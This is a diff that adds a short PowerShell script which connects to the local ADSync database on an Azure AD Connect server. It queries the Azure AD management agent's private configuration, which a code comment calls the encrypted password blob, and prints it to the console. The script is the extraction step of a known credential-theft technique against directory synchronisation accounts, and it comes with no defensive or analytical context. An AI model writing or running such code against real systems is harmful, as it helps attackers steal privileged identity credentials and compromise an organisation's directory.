@@ -1,0 +1,13 @@
+# Connect to ADSync local database
+$conn = New-Object System.Data.SqlClient.SqlConnection("Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True")
+$conn.Open()
+
+# Get encrypted password blob
+$cmd = New-Object System.Data.SqlClient.SqlCommand("SELECT private_configuration_xml FROM mms_management_agent WHERE subtype = 'Windows Azure Active Directory (Microsoft)'", $conn)
+$reader = $cmd.ExecuteReader()
+$reader.Read()
+$config = $reader["private_configuration_xml"]
+$reader.Close()
+$conn.Close()
+
+Write-Host $config
